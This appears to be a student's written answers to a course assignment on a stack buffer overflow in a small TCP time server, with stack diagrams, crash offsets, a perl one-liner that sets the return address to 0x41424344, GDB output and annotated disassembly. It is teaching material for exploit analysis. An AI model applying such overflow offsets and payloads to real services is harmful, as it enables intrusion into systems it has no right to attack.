@@ -1,0 +1,111 @@
+1. Describe the manner in which user input is accepted by the vulnerable program.
+	Connnect to the process via TCP connection on port 3333.  No authentication is required.
+
+2. What function contains the stack overflow? (The name may vary depending on how you
+disassemble the program, be as specific as you can based on either the source code, or a
+reference to a disassembly listing). At a minimum, provide the virtual address of the first
+instruction of the vulnerable function.
+	The function 'doGreeting' contains the stack overflow, but the buffer is actually allocated inside of the frame of handleClient.
+
+
+3. What is the stack layout of the vulnerable function? This should look like the stack
+diagrams you generated in assignment 3.
+
+	Address		Name	Size		Type
+doGreeting (char * buf)
+	[ebp-24]	?	24 bytes	char ** (?)
+	[ebp]		oldfp	4 bytes		void *
+	[ebp+4]		return	4 bytes		void *
+	[ebp+8]		name	4 bytes		char *
+
+handleClient ()
+	[ebp-312]	unused	28 bytes	unknown (frame set-up)
+	[ebp-284]	now_t	4 bytes		time_t
+	[ebp-280]	buf	256 bytes	char *
+	[ebp-24]	now_str	24 bytes (?)	char *
+	[ebp]		oldfp	4 bytes		void *
+	[ebp+4]		return	4 bytes		void *
+
+4. What is the minimum amount of input that must be supplied to cause the program to
+crash in some way? What is causing the crash?
+	Exactly 284 bytes will cause the program to malfunction - the NULL byte of the input string overwrites the last byte of the return address thus becoming 0x08048c00 which returns back inside of main right after the program forked.  The program will call handleClient and doGreeting again, which overwrites the stack correctly again.  This loop can continue indefinitely.
+	Exactly 285 bytes (0x41) will overwrite the return address to 0x08040041 which is not a mapped memory region thus causing a segmentation fault.  
+	The program crashes not on the return from doGreeting, but when returning from handleClient.  This means that when connecting to the server, only the forked process crashes, not the server itself.  There is no indication that the server process has crashed.  In order to get a visible crash (through the client connection), 542 bytes must be written, which overwrite the environment variables and cause the time function call to fail.
+
+5. How much user input must be supplied to completely corrupt the saved return address?
+	Exactly 287 bytes will completely corrupt the saved return address for handleClient.
+
+6. Are there any restrictions on the content and format of the user supplied input? In other
+words, must you satisfy any input validation checks and are there any byte values that
+you cannot send inside your buffer.
+
+
+7. Provide an input string that results in the program crashing at location 0x41424344.
+perl -e 'print "A"x284 . "\x44\x43\x42\x41"'
+
+GDB output-
+	Breakpoint 1, 0x08048a69 in handleClient ()
+	(gdb) x /wx $esp
+	0xbf863c6c:	0x41424344
+	(gdb) stepi
+	0x41424344 in ?? ()
+	(gdb) stepi
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x41424344 in ?? ()
+
+08048992 <doGreeting>:
+ 8048992:	push   ebp
+ 8048993:	mov    ebp,esp
+ 8048995:	sub    esp,0x18
+ 8048998:	mov    DWORD PTR [esp],0x8048d70	# "Welcome to the simple time
+ 804899f:	call   80487bc <puts@plt>
+ 80489a4:	mov    DWORD PTR [esp],0x8048d92	# "What is your name?"
+ 80489ab:	call   80487bc <puts@plt>
+ 80489b0:	mov    eax,ds:0x80491e0			# STDOUT
+ 80489b5:	mov    DWORD PTR [esp],eax
+ 80489b8:	call   80486fc <fflush@plt>
+ 80489bd:	mov    eax,DWORD PTR [ebp+0x8]		# char *name
+ 80489c0:	mov    DWORD PTR [esp],eax
+ 80489c3:	call   804867c <gets@plt>
+ 80489c8:	mov    eax,0x8048da5			# "Pleased to meet you %s!\n"
+ 80489cd:	mov    edx,DWORD PTR [ebp+0x8]		# char *name
+ 80489d0:	mov    DWORD PTR [esp+0x4],edx
+ 80489d4:	mov    DWORD PTR [esp],eax
+ 80489d7:	call   804873c <printf@plt>
+ 80489dc:	leave  
+ 80489dd:	ret    
+
+080489de <handleClient>:
+ 80489de:	push   ebp
+ 80489df:	mov    ebp,esp
+ 80489e1:	sub    esp,0x138
+ 80489e7:	mov    DWORD PTR [ebp-0xc],0x0
+ 80489ee:	mov    DWORD PTR [ebp-0x10],0x0
+ 80489f5:	mov    DWORD PTR [ebp-0x14],0x0
+ 80489fc:	lea    eax,[ebp-0x118]			# char *buf
+ 8048a02:	mov    DWORD PTR [esp],eax
+ 8048a05:	call   8048992 <doGreeting>
+ 8048a0a:	mov    DWORD PTR [esp],0x0
+ 8048a11:	call   80487ac <time@plt>
+ 8048a16:	mov    DWORD PTR [ebp-0x11c],eax
+ 8048a1c:	lea    eax,[ebp-0x11c]			# time_t now_t
+ 8048a22:	mov    DWORD PTR [esp],eax
+ 8048a25:	call   80487ac <time@plt>
+ 8048a2a:	lea    eax,[ebp-0x11c]
+ 8048a30:	mov    DWORD PTR [esp],eax
+ 8048a33:	call   804875c <ctime@plt>
+ 8048a38:	mov    DWORD PTR [ebp-0x18],eax
+ 8048a3b:	mov    eax,0x8048dbe			# "The time is %s"
+ 8048a40:	mov    edx,DWORD PTR [ebp-0x18]		# char *now_str
+ 8048a43:	mov    DWORD PTR [esp+0x4],edx
+ 8048a47:	mov    DWORD PTR [esp],eax
+ 8048a4a:	call   804873c <printf@plt>
+ 8048a4f:	mov    DWORD PTR [esp],0x8048dcd	# "Have a nice day!"
+ 8048a56:	call   80487bc <puts@plt>
+ 8048a5b:	mov    eax,ds:0x80491e0			# STDOUT
+ 8048a60:	mov    DWORD PTR [esp],eax
+ 8048a63:	call   80486fc <fflush@plt>
+ 8048a68:	leave  
+ 8048a69:	ret    
+
